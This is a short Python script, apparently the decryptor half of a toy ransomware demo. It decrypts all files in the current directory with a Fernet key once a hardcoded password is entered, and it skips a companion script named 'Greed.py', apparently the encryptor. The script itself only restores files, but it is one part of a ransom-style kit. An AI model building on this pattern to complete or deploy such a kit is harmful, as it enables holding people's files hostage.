#import our ish to do ish
import os
from cryptography.fernet import Fernet

#looking for le files
files = []

#make sure we only get the files we want
for file in os.listdir():
    if file == "Greed.py" or file == "magicword.key" or file == "Mercy.py":
        continue
    if os.path.isfile(file):
        files.append(file)

#get key for decryption
with open("magicword.key", "rb") as key:
    secretkey = key.read()

#secret phrase, the password, to get the boi to give the ish back all decrypted and the like
secretphrase = "ijustworkhere"

user_phrase = input("What's the password?\n")

if user_phrase == secretphrase:

#take files, decrypt them and stuff them into a bag- I mean file
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)

    print("Very good, here are the bois. Have a wonderful day")
else:
    print("hehe, nope! You can try again though, because I'm nice like that")